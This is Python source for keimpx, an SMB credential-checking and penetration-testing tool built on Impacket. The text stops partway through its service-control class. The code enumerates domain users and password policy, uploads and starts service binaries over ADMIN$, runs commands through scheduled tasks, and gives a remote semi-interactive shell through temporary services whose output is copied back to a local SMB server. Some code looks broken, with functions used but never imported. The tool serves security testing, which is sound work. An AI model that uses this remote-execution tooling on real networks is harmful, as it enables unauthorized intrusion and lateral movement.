#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-
# -*- Mode: python -*-

'''
keimpx is an open source tool, released under a modified version of Apache
License 1.1. It is developed in Python using CORE Security Technologies's
Impacket library, http://code.google.com/p/impacket/.

It can be used to quickly check for the usefulness of credentials across a
network over SMB.

Homepage:                   https://inquisb.github.com/keimpx
Usage:                      https://github.com/inquisb/keimpx#usage
Examples:                   https://github.com/inquisb/keimpx/wiki/Examples
Frequently Asked Questions: https://github.com/inquisb/keimpx/wiki/FAQ
Contributors:               https://github.com/inquisb/keimpx#contributors

License:

I provide this software under a slightly modified version of the
Apache Software License. The only changes to the document were the
replacement of 'Apache' with 'keimpx' and 'Apache Software Foundation'
with 'Bernardo Damele A. G.'. Feel free to compare the resulting document
to the official Apache license.

The `Apache Software License' is an Open Source Initiative Approved
License.

The Apache Software License, Version 1.1
Modifications by Bernardo Damele A. G. (see above)

Copyright (c) 2009-2013 Bernardo Damele A. G. <bernardo.damele@gmail.com>
All rights reserved.

This product includes software developed by CORE Security Technologies
(http://www.coresecurity.com/).

THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESSED OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED.  IN NO EVENT SHALL THE APACHE SOFTWARE FOUNDATION OR
ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF
USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
SUCH DAMAGE.
'''

__author__ = 'Bernardo Damele A. G. <bernardo.damele@gmail.com>'
__version__ = '0.3-dev'

import binascii
import cmd
import ConfigParser
import inspect
import logging
import os
import ntpath
import random
import re
import rlcompleter
import shlex
import socket
import string
import sys
import threading
import time
import traceback
import warnings

from optparse import OptionError
from optparse import OptionGroup
from optparse import OptionParser
from subprocess import mswindows
from subprocess import PIPE
from subprocess import Popen
from subprocess import STDOUT
from telnetlib import Telnet
from threading import Thread

try:
    import pyreadline as readline
    have_readline = True
except ImportError:
    try:
        import readline
        have_readline = True
    except ImportError:
        have_readline = False

try:
    from impacket import ImpactPacket
    from impacket import nt_errors
    from impacket import smbserver
    from impacket.nmb import NetBIOSTimeout
    from impacket.dcerpc import atsvc
    from impacket.dcerpc import dcerpc
    from impacket.dcerpc import ndrutils
    from impacket.dcerpc import srvsvc
    from impacket.dcerpc import svcctl
    from impacket.dcerpc import transport
    from impacket.dcerpc import winreg
    from impacket.dcerpc.samr import *
    from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21
    from impacket.smbconnection import SessionError
    from impacket.smbconnection import SMB_DIALECT
    from impacket.smbconnection import SMBConnection
except ImportError:
    sys.stderr.write('You need to install Python Impacket library first.\nGet it from Core Security\'s Google Code repository:\n$ svn checkout http://impacket.googlecode.com/svn/trunk/ impacket\n$ cd impacket\n$ python setup.py build\n$ sudo python setup.py install\n')
    sys.exit(255)

added_credentials = set()
added_targets = set()
credentials = []
conf = {}
domains = []
pool_thread = None
successes = 0
targets = []
execute_commands = []
default_share = 'ADMIN$'
default_reg_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName'
logger = logging.getLogger('logger')
logger_handler = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', '%H:%M:%S')
logger_handler.setFormatter(formatter)
logger.addHandler(logger_handler)
logger.setLevel(logging.WARN)
socket.setdefaulttimeout(3)

if hasattr(sys, 'frozen'):
    keimpx_path = os.path.dirname(unicode(sys.executable, sys.getfilesystemencoding()))
else:
    keimpx_path = os.path.dirname(os.path.realpath(__file__))

class keimpxError(Exception):
    pass

class credentialsError(keimpxError):
    pass

class domainError(keimpxError):
    pass

class targetError(keimpxError):
    pass

class threadError(keimpxError):
    pass

class missingOption(keimpxError):
    pass

class missingService(keimpxError):
    pass

class missingShare(keimpxError):
    pass

class missingFile(keimpxError):
    pass

class registryKey(keimpxError):
    pass

########################################################################
# Code ripped with permission from deanx's polenum tool,               #
# http://labs.portcullis.co.uk/application/polenum/                    #
########################################################################
def get_obj(name):
    return eval(name)

def d2b(a):
    bin = []

    while a:
        bin.append(a%2)
        a /= 2

    return bin[::-1]

def display_time(filetime_high, filetime_low, minutes_utc=0):
    import __builtins__
    d = filetime_low + (filetime_high)*16**8 # convert to 64bit int
    d *= 1.0e-7 # convert to seconds
    d -= 11644473600 # remove 3389 years?

    try:
        return strftime('%a, %d %b %Y %H:%M:%S +0000ddddd', localtime(d)) # return the standard format day
    except ValueError, e:
        return '0'

class ExtendInplace(type):
    def __new__(self, name, bases, dict):
        prevclass = get_obj(name)
        del dict['__module__']
        del dict['__metaclass__']

        # We can't use prevclass.__dict__.update since __dict__
        # isn't a real dict
        for k, v in dict.iteritems():
            setattr(prevclass, k, v)

        return prevclass

def convert(low, high, no_zero):
    if low == 0 and hex(high) == '-0x80000000':
        return 'Not Set'
    if low == 0 and high == 0:
        return 'None'
    if no_zero: # make sure we have a +ve vale for the unsined int
        if (low != 0):
            high = 0 - (high+1)
        else:
            high = 0 - (high)
        low = 0 - low

    tmp = low + (high)*16**8 # convert to 64bit int
    tmp *= (1e-7) #  convert to seconds

    try:
        minutes = int(strftime('%M', gmtime(tmp)))  # do the conversion to human readable format
    except ValueError, e:
        return 'BAD TIME:'

    hours = int(strftime('%H', gmtime(tmp)))
    days = int(strftime('%j', gmtime(tmp)))-1
    time = ''

    if days > 1:
     time = str(days) + ' days '
    elif days == 1:
        time = str(days) + ' day '
    if hours > 1:
        time += str(hours) + ' hours '
    elif hours == 1:
        time = str(days) + ' hour '    
    if minutes > 1:
        time += str(minutes) + ' minutes'
    elif minutes == 1:
        time = str(days) + ' minute '

    return time

class MSRPCPassInfo:
    PASSCOMPLEX = {
                    5: 'Domain Password Complex',
                    4: 'Domain Password No Anon Change',
                    3: 'Domain Password No Clear Change',
                    2: 'Domain Password Lockout Admins',
                    1: 'Domain Password Store Cleartext',
                    0: 'Domain Refuse Password Change'
                  }

    def __init__(self, data = None):
        self._min_pass_length = 0
        self._pass_hist = 0
        self._pass_prop= 0
        self._min_age_low = 0
        self._min_age_high = 0
        self._max_age_low = 0
        self._max_age_high = 0
        self._pwd_can_change_low = 0
        self._pwd_can_change_high = 0
        self._pwd_must_change_low = 0
        self._pwd_must_change_high = 0
        self._max_force_low = 0
        self._max_force_high = 0
        self._role = 0
        self._lockout_window_low = 0
        self._lockout_window_high = 0
        self._lockout_dur_low = 0
        self._lockout_dur_high = 0
        self._lockout_thresh = 0

        if data:
            self.set_header(data, 1)

    def set_header(self,data,level):
        index = 8

        if level == 1: 
            self._min_pass_length, self._pass_hist, self._pass_prop, self._max_age_low, self._max_age_high, self._min_age_low, self._min_age_high = unpack('<HHLllll',data[index:index+24])
            bin = d2b(self._pass_prop)

            if len(bin) != 8:
                for x in xrange(6 - len(bin)):
                    bin.insert(0,0)

            self._pass_prop =  ''.join([str(g) for g in bin])    

        if level == 3:
            self._max_force_low, self._max_force_high = unpack('<ll',data[index:index+8])
        elif level == 7:
            self._role = unpack('<L',data[index:index+4])
        elif level == 12:
            self._lockout_dur_low, self._lockout_dur_high, self._lockout_window_low, self._lockout_window_high, self._lockout_thresh = unpack('<llllH',data[index:index+18])

    def print_friendly(self):
        print 'Minimum password length: %s' % str(self._min_pass_length or 'None')
        print 'Password history length: %s' % str(self._pass_hist or 'None' )
        print 'Maximum password age: %s' % str(convert(self._max_age_low, self._max_age_high, 1))
        print 'Password Complexity Flags: %s' % str(self._pass_prop or 'None')
        print 'Minimum password age: %s' % str(convert(self._min_age_low, self._min_age_high, 1))
        print 'Reset Account Lockout Counter: %s' % str(convert(self._lockout_window_low,self._lockout_window_high, 1)) 
        print 'Locked Account Duration: %s' % str(convert(self._lockout_dur_low,self._lockout_dur_high, 1)) 
        print 'Account Lockout Threshold: %s' % str(self._lockout_thresh or 'None')
        print 'Forced Log off Time: %s' % str(convert(self._max_force_low, self._max_force_high, 1))

        i = 0

        for a in self._pass_prop:
            print '%s: %s' % (self.PASSCOMPLEX[i], str(a))

            i+= 1

        return

class SAMREnumDomainsPass(ImpactPacket.Header):
    OP_NUM = 0x2E

    __SIZE = 22

    def __init__(self, aBuffer = None):
        ImpactPacket.Header.__init__(self, SAMREnumDomainsPass.__SIZE)

        if aBuffer:
            self.load_header(aBuffer)

    def get_context_handle(self):
        return self.get_bytes().tolist()[:20]

    def set_context_handle(self, handle):
        assert 20 == len(handle)
        self.get_bytes()[:20] = array.array('B', handle)

    def get_resume_handle(self):
        return self.get_long(20, '<')

    def set_resume_handle(self, handle):
        self.set_long(20, handle, '<')

    def get_account_control(self):
        return self.get_long(20, '<')

    def set_account_control(self, mask):
        self.set_long(20, mask, '<')

    def get_pref_max_size(self):
        return self.get_long(28, '<')

    def set_pref_max_size(self, size):
        self.set_long(28, size, '<')

    def get_header_size(self):
        return SAMREnumDomainsPass.__SIZE

    def get_level(self):
        return self.get_word(20, '<')

    def set_level(self, level):
        self.set_word(20, level, '<')

class SAMRRespLookupPassPolicy(ImpactPacket.Header):
    __SIZE = 4

    def __init__(self, aBuffer = None):
        ImpactPacket.Header.__init__(self, SAMRRespLookupPassPolicy.__SIZE)

        if aBuffer:
            self.load_header(aBuffer)

    def get_pass_info(self):
        return MSRPCPassInfo(self.get_bytes()[:-4].tostring())

    def set_pass_info(self, info, level):
        assert isinstance(info, MSRPCPassInfo)
        self.get_bytes()[:-4] = array.array('B', info.rawData())

    def get_return_code(self):
        return self.get_long(-4, '<')

    def set_return_code(self, code):
        self.set_long(-4, code, '<')

    def get_context_handle(self):
        return self.get_bytes().tolist()[:12]

    def get_header_size(self):
        var_size = len(self.get_bytes()) - SAMRRespLookupPassPolicy.__SIZE
        assert var_size > 0

        return SAMRRespLookupPassPolicy.__SIZE + var_size

class DCERPCSamr:
    __metaclass__ = ExtendInplace

    def enumpswpolicy(self,context_handle): # needs to make 3 requests to get all pass policy
        enumpas = SAMREnumDomainsPass()
        enumpas.set_context_handle(context_handle)
        enumpas.set_level(1)
        self._dcerpc.send(enumpas)
        data = self._dcerpc.recv()

        retVal = SAMRRespLookupPassPolicy(data)
        pspol = retVal.get_pass_info()
        enumpas = SAMREnumDomainsPass()
        enumpas.set_context_handle(context_handle)
        enumpas.set_level(3)
        self._dcerpc.send(enumpas)
        data = self._dcerpc.recv()
        pspol.set_header(data,3)

        enumpas = SAMREnumDomainsPass()
        enumpas.set_context_handle(context_handle)
        enumpas.set_level(7)
        self._dcerpc.send(enumpas)
        data = self._dcerpc.recv()
        pspol.set_header(data,7)

        enumpas = SAMREnumDomainsPass()
        enumpas.set_context_handle(context_handle)
        enumpas.set_level(12)
        self._dcerpc.send(enumpas)
        data = self._dcerpc.recv()
        pspol.set_header(data,12)

        return pspol 

    def opendomain(self, context_handle, domain_sid):
        opendom = SAMROpenDomainHeader()
        opendom.set_access_mask(0x305)
        opendom.set_context_handle(context_handle)
        opendom.set_domain_sid(domain_sid)
        self._dcerpc.send(opendom)
        data = self._dcerpc.recv()
        retVal = SAMRRespOpenDomainHeader(data)

        return retVal

################################################################
# Code borrowed and adapted from Impacket's smbexec.py example #
################################################################
class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.__smbserver_dir = 'svcshell'
        self.__smbserver_share = 'KEIMPX'

    def cleanup_server(self):
        logger.debug('Cleaning up local SMB server..')
        os.unlink(self.__smbserver_dir + '/smb.log')
        os.rmdir(self.__smbserver_dir)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',self.__smbserver_dir + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(self.__smbserver_share)
        smbConfig.set(self.__smbserver_share,'comment','')
        smbConfig.set(self.__smbserver_share,'read only','no')
        smbConfig.set(self.__smbserver_share,'share type','0')
        smbConfig.set(self.__smbserver_share,'path',self.__smbserver_dir)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0', 445), config_parser = smbConfig)

        logger.debug('Creating tmp directory')

        try:
            os.mkdir(self.__smbserver_dir)
        except Exception, e:
            print e
            pass

        logger.info('Setting up SMB Server')
        self.smb.processConfigFile()
        logger.debug('Ready to listen...')

        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

class SvcShell(cmd.Cmd):
    def __init__(self, svc, mgr_handle, rpc, mode):
        cmd.Cmd.__init__(self)
        self.__svc = svc
        self.__mgr_handle = mgr_handle
        self.__rpc = rpc
        self.__share = 'C$'
        self.__mode = mode
        self.__output_file = '%s.txt' % ''.join([random.choice(string.letters) for _ in range(8)])
        self.__output = ntpath.join('\\', 'Windows', 'Temp', self.__output_file)
        self.__batch_filename = '%s.bat' % ''.join([random.choice(string.letters) for _ in range(8)])
        self.__batchFile = ntpath.join('%TEMP%', self.__batch_filename)
        self.__smbserver_dir = 'svcshell'
        self.__smbserver_share = 'KEIMPX'
        self.__outputBuffer = ''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c'
        self.__service_name = ''.join([random.choice(string.letters) for _ in range(8)]).encode('utf-16le')

        logger.info('Launching semi-interactive shell')
        logger.debug('Going to use temporary service %s' % self.__service_name)

        s = self.__rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on
        s.setTimeout(100000)

        if self.__mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, self.__smbserver_share)

        self.transferClient = self.__rpc.get_smb_connection()
        self.execute_remote('cd ')

        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = string.replace(self.__outputBuffer, '\r\n', '') + '>'
            self.__outputBuffer = ''

    def emptyline(self):
        return False

    def default(self, line):
        if line != '':
            self.send_data(line)

    def do_shell(self, cmd):
        process = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
        stdout, _ = process.communicate()

        if stdout is not None:
            print stdout

    def do_exit(self, line):
        return True

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__mode == 'SERVER':
            fd = open(self.__smbserver_dir + '/' + self.__output_file,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(self.__smbserver_dir + '/' + self.__output_file)
        else:
            self.transferClient.getFile(self.__share, self.__output, output_callback)
            self.transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        command = '%s echo %s ^> %s > %s & %s %s' % (self.__shell, data, self.__output, self.__batchFile, self.__shell, self.__batchFile)

        if self.__mode == 'SERVER':
            command += ' & %s' % self.__copyBack

        command += ' & del %s' % self.__batchFile

        logger.debug('Creating service with executable path: %s' % command)

        resp = self.__svc.CreateServiceW(self.__mgr_handle, self.__service_name, self.__service_name, command.encode('utf-16le'))
        service = resp['ContextHandle']

        try:
           self.__svc.StartServiceW(service)
        except:
           pass

        self.__svc.DeleteService(service)
        self.__svc.CloseServiceHandle(service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print self.__outputBuffer
        self.__outputBuffer = ''

def check_dialect(dialect):
    if dialect == SMB_DIALECT:
        return 'SMBv1'
    elif dialect == SMB2_DIALECT_002:
        return 'SMBv2.0'
    elif dialect == SMB2_DIALECT_21:
        return 'SMBv2.1'
    else:
        return 'SMBv3.0'

def replace(value):
    return value.replace('/', '\\')

class AtSvc(object):
    def __init__(self):
        pass

    def __output_callback(self, data):
        print data

    def atexec(self, command):
        self.__command = command
        self.__tmpFileName = ''.join([random.choice(string.letters) for i in range(8)]) + '.tmp'

        self.__atsvc_connect()

        command = '%%COMSPEC%% /C %s > %%SystemRoot%%\\Temp\\%s\x00' % (self.__command, self.__tmpFileName)

        logger.debug('Creating scheduled task with command: %s' % command)

        # Check [MS-TSCH] Section 2.3.4
        self.__atInfo = atsvc.AT_INFO()
        self.__atInfo['JobTime']         = 0
        self.__atInfo['DaysOfMonth']     = 0
        self.__atInfo['DaysOfWeek']      = 0
        self.__atInfo['Flags']           = 0
        self.__atInfo['Command']         = ndrutils.NDRUniqueStringW()
        self.__atInfo['Command']['Data'] = (command).encode('utf-16le')

        resp = self.__at.NetrJobAdd(('\\\\%s'% self.trans.get_dip()), self.__atInfo)
        jobId = resp['JobID']

        # Switching context to TSS
        self.__dce2 = self.__dce.alter_ctx(atsvc.MSRPC_UUID_TSS)

        # Now atsvc should use that new context
        self.__at = atsvc.DCERPCAtSvc(self.__dce2)

        resp = self.__at.SchRpcRun('\\At%d' % jobId)
        # On the first run, it takes a while the remote target to start executing the job
        # so I'm setting this sleep.. I don't like sleeps.. but this is just an example
        # Best way would be to check the task status before attempting to read the file
        logger.debug('Wait...')
        time.sleep(3)

        # Switching back to the old ctx_id
        self.__at = atsvc.DCERPCAtSvc(self.__dce)
        resp = self.__at.NetrJobDel('\\\\%s'% self.trans.get_dip(), jobId, jobId)
        self.__tmpFilePath = ntpath.join('Temp', self.__tmpFileName)
        self.transferClient = self.trans.get_smb_connection()

        while True:
            try:
                self.transferClient.getFile(self.share, self.__tmpFilePath, self.__output_callback)
                break
            except Exception, e:
                if str(e).find('SHARING') > 0:
                    time.sleep(3)
                else:
                    raise

        self.transferClient.deleteFile(self.share, self.__tmpFilePath)
        self.__atsvc_disconnect()

    def __atsvc_connect(self):
        '''
        Connect to atsvc named pipe
        '''
        self.check_share(default_share)

        logger.debug('Connecting to the ATSVC named pipe')
        self.smb_transport('atsvc')

        logger.debug('Binding on Task Manager (ATSVC) interface')
        self.__dce = self.trans.get_dce_rpc()
        self.__dce.set_credentials(*self.trans.get_credentials())
        self.__dce.connect()
        self.__dce.bind(atsvc.MSRPC_UUID_ATSVC)
        self.__at = atsvc.DCERPCAtSvc(self.__dce)

    def __atsvc_disconnect(self):
        '''
        Disconnect from samr named pipe
        '''
        logger.debug('Disconneting from the ATSVC named pipe')
        self.__dce.disconnect()


class Samr(object):
    def __init__(self):
        pass

    def users(self, usrdomain):
        self.__samr_connect()
        self.__samr_users(usrdomain)
        self.__samr_disconnect()

    def pswpolicy(self, usrdomain):
        self.__samr_connect()
        self.__samr_pswpolicy(usrdomain)
        self.__samr_disconnect()

    def domains(self):
        self.__samr_connect()
        self.__samr_domains()
        self.__samr_disconnect()

    def __samr_connect(self):
        '''
        Connect to samr named pipe
        '''
        logger.debug('Connecting to the SAMR named pipe')
        self.smb_transport('samr')

        logger.debug('Binding on Security Account Manager (SAM) interface')
        self.__dce = self.trans.get_dce_rpc()
        self.__dce.bind(MSRPC_UUID_SAMR)
        self.__samr = DCERPCSamr(self.__dce)
        self.__resp = self.__samr.connect()
        self.__mgr_handle = self.__resp.get_context_handle()

    def __samr_disconnect(self):
        '''
        Disconnect from samr named pipe
        '''
        logger.debug('Disconneting from the SAMR named pipe')

        if self.__mgr_handle:
            data = self.__samr.closerequest(self.__mgr_handle)

        self.__dce.disconnect()

    def __samr_users(self, usrdomain=None):
        '''
        Enumerate users on the system
        '''
        self.__samr_domains(False)

        encoding = sys.getdefaultencoding()

        for domain_name, domain in self.domains_dict.items():
            if usrdomain and usrdomain.upper() != domain_name.upper():
                continue

            logger.info('Looking up users in domain %s' % domain_name)

            resp = self.__samr.lookupdomain(self.__mgr_handle, domain)
            resp = self.__samr.opendomain(self.__mgr_handle, resp.get_domain_sid())
            self.__domain_context_handle = resp.get_context_handle()
            resp = self.__samr.enumusers(self.__domain_context_handle)

            done = False

            while done is False:
                for user in resp.get_users().elements():
                    uname = user.get_name().encode(encoding, 'replace')
                    uid = user.get_id()

                    r = self.__samr.openuser(self.__domain_context_handle, uid)
                    logger.debug('Found user %s (UID: %d)' % (uname, uid))

                    if r.get_return_code() == 0:
                        info = self.__samr.queryuserinfo(r.get_context_handle()).get_user_info()
                        entry = (uname, uid, info)
                        self.users_list.add(entry)
                        c = self.__samr.closerequest(r.get_context_handle())

                # Do we have more users?
                if resp.get_return_code() == 0x105:
                    resp = self.__samr.enumusers(self.__domain_context_handle, resp.get_resume_handle())
                else:
                    done = True

            if self.users_list:
                num = len(self.users_list)
                logger.info('Retrieved %d user%s' % (num, 's' if num > 1 else ''))
            else:
                logger.info('No users enumerated')

            for entry in self.users_list:
                user, uid, info = entry

                print user
                print '  User ID: %d' % uid
                print '  Group ID: %d' % info.get_group_id()
                print '  Enabled: %s' % ('False', 'True')[info.is_enabled()]

                try:
                    print '  Logon count: %d' % info.get_logon_count()
                except ValueError:
                    pass

                try:
                    print '  Last Logon: %s' % info.get_logon_time()
                except ValueError:
                    pass

                try:
                    print '  Last Logoff: %s' % info.get_logoff_time()
                except ValueError:
                    pass

                try:
                    print '  Kickoff: %s' % info.get_kickoff_time()
                except ValueError:
                    pass

                try:
                    print '  Last password set: %s' % info.get_pwd_last_set()
                except ValueError:
                    pass

                try:
                    print '  Password can change: %s' % info.get_pwd_can_change()
                except ValueError:
                    pass

                try:
                    print '  Password must change: %s' % info.get_pwd_must_change()
                except ValueError:
                    pass

                try:
                    print '  Bad password count: %d' % info.get_bad_pwd_count()
                except ValueError:
                    pass

                items = info.get_items()

                for i in MSRPCUserInfo.ITEMS.keys():
                    name = items[MSRPCUserInfo.ITEMS[i]].get_name()
                    name = name.encode(encoding, 'replace')

                    if name:
                        print '  %s: %s' % (i, name)

            self.users_list = set()

    def __samr_pswpolicy(self, usrdomain=None):
        '''
        Enumerate password policy on the system
        '''
        self.__samr_domains(False)

        encoding = sys.getdefaultencoding()

        for domain_name, domain in self.domains_dict.items():
            if usrdomain and usrdomain.upper() != domain_name.upper():
                continue

            logger.info('Looking up password policy in domain %s' % domain_name)

            resp = self.__samr.lookupdomain(self.__mgr_handle, domain)
            resp = self.__samr.opendomain(self.__mgr_handle, resp.get_domain_sid())
            self.__domain_context_handle = resp.get_context_handle()
            resp = self.__samr.enumpswpolicy(self.__domain_context_handle)
            resp.print_friendly()

    def __samr_domains(self, display=True):
        '''
        Enumerate domains to which the system is part of
        '''
        logger.info('Enumerating domains')

        resp = self.__samr.enumdomains(self.__mgr_handle)
        domains = resp.get_domains().elements()

        if display is True:
            print 'Domains:'

        for domain in range(0, resp.get_entries_num()):
            domain = domains[domain]
            domain_name = domain.get_name()

            if domain_name not in self.domains_dict:
                self.domains_dict[domain_name] = domain

            if display is True:
                print '  %s' % domain_name

class SvcCtl(object):
    def __init__(self):
        pass

    def services(self, srvname):
        self.__svcctl_connect()
        self.__svcctl_list(srvname)
        self.__svcctl_disconnect()

    def status(self, srvname):
        self.__svcctl_connect()
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_status(srvname)
        self.__svcctl_disconnect()

    def query(self, srvname):
        self.__svcctl_connect()
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_config(srvname)
        self.__svcctl_disconnect()

    def start(self, srvname, srvargs=''):
        self.__svcctl_connect()
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_start(srvname, srvargs)
        self.__svcctl_disconnect(srvname)

    def stop(self, srvname):
        self.__svcctl_connect()
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_stop(srvname)
        self.__svcctl_disconnect(srvname)

    def change(self, srvname):
        self.__svcctl_connect()
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_change(srvname)
        self.__svcctl_disconnect(srvname)

    def deploy(self, srvname, local_file=None, srvargs='', remote_file=None, displayname=None):
        self.__oldpwd = self.pwd
        self.pwd = '\\'

        self.__svcctl_bin_upload(local_file, remote_file)
        self.__svcctl_connect()
        self.__svcctl_create(srvname, remote_file, displayname)
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_start(srvname, srvargs)
        self.__svcctl_disconnect(srvname)

        self.pwd = self.__oldpwd

    def undeploy(self, srvname):
        self.__oldpwd = self.pwd
        self.pwd = '\\'

        self.__svcctl_connect()
        self.__svcctl_srv_manager(srvname)
        resp = self.__svc.QueryServiceConfigW(self.__svc_handle)
        remote_file = resp['QueryConfig']['BinaryPathName'].decode('utf-16le')
        remote_file = str(os.path.basename(remote_file.replace('\\', '/')))

        if self.__svcctl_status(srvname, return_status=True) == 'RUNNING':
            self.__svcctl_stop(srvname)

        self.__svcctl_delete(srvname)
        self.__svcctl_disconnect(srvname)
        self.__svcctl_bin_remove(remote_file)
        self.pwd = self.__oldpwd

    def svcshell(self, mode='SHARE'):
        self.__svcctl_connect()

        try:
            if mode == 'SERVER':
                serverThread = SMBServer()
                serverThread.daemon = True
                serverThread.start()

            self.shell = SvcShell(self.__svc, self.__mgr_handle, self.trans, mode)
            self.shell.cmdloop()

            if mode == 'SERVER':
                serverThread.stop()
        except SessionError, e:
            #traceback.print_exc()
            logger.error('SMB error: %s' % (e.getErrorString(), ))
        except KeyboardInterrupt, _:
            print
            logger.info('User aborted')
        except Exception, e:
            #traceback.print_exc()
            logger.error(str(e))

        sys.stdout.flush()
        self.__svcctl_disconnect()

    def __svcctl_srv_manager(self, srvname):
        self.__resp = self.__svc.OpenServiceW(self.__mgr_handle, srvname.encode('utf-16le'))
        self.__svc_handle = self.__resp['ContextHandle']

    def __svcctl_connect(self):
        '''
        Connect to svcctl named pipe
        '''
        logger.debug('Connecting to the SVCCTL named pipe')
        self.smb_transport('svcctl')

        logger.debug('Binding on Services Control Manager (SCM) interface')
        self.__dce = self.trans.get_dce_rpc()
        self.__dce.bind(svcctl.MSRPC_UUID_SVCCTL)
        self.__svc = svcctl.DCERPCSvcCtl(self.__dce)
        self.__resp = self.__svc.OpenSCManagerW()
        self.__mgr_handle = self.__resp['ContextHandle']

    def __svcctl_disconnect(self, srvname=None):
        '''
        Disconnect from svcctl named pipe
        '''
        logger.debug('Disconneting from the SVCCTL named pipe')

        if srvname:
            self.__svc.CloseServiceHandle(self.__svc_handle)

        if self.__mgr_handle:
            self.__svc.CloseServiceHandle(self.__mgr_handle)

        self.__dce.disconnect()

    def __svcctl_bin_upload(self, local_file, remote_file):
        '''
        Upload the service executable
        '''
        self.check_share(default_share)
        self.__pathname = ntpath.join(default_share, remote_file)
        logger.info('Uploading the service executable to %s' % self.__pathname)
        self.upload(local_file, remote_file)

    def __svcctl_bin_remove(self, remote_file):
        '''
        Remove the service executable
        '''
        self.check_share(default_share)
        self.__pathname = ntpath.join(default_share, remote_file)
        logger.info('Removing the service executable %s' % self.__pathname)
        self.rm(remote_file)

    def __svcctl_create(self, srvname, remote_file, displayname=None):
        '''
        Create the service
        '''
        logger.info('Creating the service %s' % srvname)

        if not displayname:
            displayname = srvname

        self.__pathname = ntpath.join('%SystemRoot%', remote_file)
        self.__pathname = self.__pathname.encode('utf-16le')
        self.__svc.CreateServiceW(self.__mgr_handle, srvname.encode('utf-16le'), displayname.encode('utf-16le'), self.__pathname)

    def __svcctl_delete(self, srvname):
        '''
        Delete the service
        '''
        logger.info('Deleting the service %s' % srvname)
        self.__svc.DeleteService(self.__svc_handle)

    def __svcctl_parse_config(self, resp):
        print 'TYPE              : %2d - ' % resp['QueryConfig']['ServiceType'],

        if resp['QueryConfig']['ServiceType'] & 0x1:
            print 'SERVICE_KERNLE_DRIVER'
        if resp['QueryConfig']['ServiceType'] & 0x2:
            print 'SERVICE_FILE_SYSTEM_DRIVER'
        if resp['QueryConfig']['ServiceType'] & 0x10:
            print 'SERVICE_WIN32_OWN_PROCESS'
        if resp['QueryConfig']['ServiceType'] & 0x20:
            print 'SERVICE_WIN32_SHARE_PROCESS'
        if resp['QueryConfig']['ServiceType'] & 0x100:
            print 'SERVICE_INTERACTIVE_PROCESS'

        print 'START_TYPE        : %2d - ' % resp['QueryConfig']['StartType'],

        if resp['QueryConfig']['StartType'] == 0x0:
            print 'BOOT START'
        elif resp['QueryConfig']['StartType'] == 0x1:
            print 'SYSTEM START'
        elif resp['QueryConfig']['StartType'] == 0x2:
            print 'AUTO START'
        elif resp['QueryConfig']['StartType'] == 0x3:
            print 'DEMAND START'
        elif resp['QueryConfig']['StartType'] == 0x4:
            print 'DISABLED'
        else:
            print 'UNKOWN'

        print 'ERROR_CONTROL     : %2d - ' % resp['QueryConfig']['ErrorControl'],

        if resp['QueryConfig']['ErrorControl'] == 0x0:
            print 'IGNORE'
        elif resp['QueryConfig']['ErrorControl'] == 0x1:
            print 'NORMAL'
        elif resp['QueryConfig']['ErrorControl'] == 0x2:
            print 'SEVERE'
        elif resp['QueryConfig']['ErrorControl'] == 0x3:
            print 'CRITICAL'
        else:
            print 'UNKOWN'

        print 'BINARY_PATH_NAME  : %s' % resp['QueryConfig']['BinaryPathName'].decode('utf-16le')
        print 'LOAD_ORDER_GROUP  : %s' % resp['QueryConfig']['LoadOrderGroup'].decode('utf-16le')
        print 'TAG               : %d' % resp['QueryConfig']['TagID']
        print 'DISPLAY_NAME      : %s' % resp['QueryConfig']['DisplayName'].decode('utf-16le')
